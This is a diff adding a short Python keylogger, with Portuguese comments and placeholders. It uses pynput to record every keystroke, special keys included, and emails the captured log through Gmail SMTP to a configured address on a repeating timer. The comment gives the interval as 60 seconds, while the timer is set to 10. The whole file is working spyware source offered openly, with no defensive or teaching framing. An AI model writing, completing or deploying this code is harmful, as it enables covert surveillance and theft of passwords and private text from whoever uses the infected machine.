@@ -1,0 +1,51 @@
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+EMAIL_ORIGEM = "#coloque um email criado aqui"
+EMAIL_DESTINO = "coloque um email criado aqui"
+SENHA_EMAIL = "#coloque a senha aqui"
+
+log = ""
+
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['Subject'] = "Dados capturados pelo Keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            server.quit()
+        except Exception as e:
+            print("Erro ao enviar:", e)
+
+        log = ""
+
+    # Reagenda o envio do e-mail a cada 60 segundos
+    Timer(10, enviar_email).start()
+
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"
+        else:
+            log += f"[{key.name}]"
+
+# Inicia o listener e o envio de e-mails
+enviar_email()
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
